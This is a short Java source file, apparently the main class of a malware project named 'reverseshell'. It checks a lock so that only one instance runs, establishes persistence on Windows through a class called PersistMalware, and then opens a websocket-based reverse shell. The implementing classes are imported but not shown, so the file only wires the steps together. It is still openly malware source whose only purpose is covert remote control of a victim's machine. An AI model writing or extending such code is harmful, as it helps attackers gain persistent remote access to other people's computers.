package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.service.impl.ReverseShell;
import com.mtattab.reverseshell.service.persistence.PersistMalware;
import com.mtattab.reverseshell.util.LockMechanismUtil;


public class Main {



    public static void main(String[] args) {
//        check if the software is already alive
        LockMechanismUtil.startLockMechanism();


//        try to establish persistence
        PersistMalware persistMalware = new PersistMalware();
        System.out.println(persistMalware.createPersistenceWindows());



//        start reverse shell
        WebsocketReverseShellService reverseShell= new ReverseShell();
        reverseShell.createClient();
        reverseShell.startReverseShell();
    }




}

